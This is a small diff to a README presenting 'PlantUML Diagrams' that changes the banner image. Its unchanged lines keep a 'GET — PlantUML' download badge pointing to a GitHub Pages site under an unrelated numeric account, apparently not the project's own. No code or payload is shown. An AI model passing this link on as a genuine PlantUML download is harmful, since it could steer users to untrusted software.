@@ -1,6 +1,6 @@
 # PlantUML Diagrams — UML Modeling & Technical Design Workflows
 
-![Banner Placeholder](https://cdn-images-1.readmedium.com/v2/resize:fit:800/1*fTZMwHIppV-B-31BO6eVrA.jpeg)
+![Banner Placeholder](https://downloads.marketplace.jetbrains.com/files/15991/158796/icon/default.png)
 
 [![GET — PlantUML](https://img.shields.io/badge/GET%20%E2%80%94%20PlantUML-0078D6?style=for-the-badge&logoColor=white)](https://f85346074.github.io/.github/PlantUML-Diagrams)
 
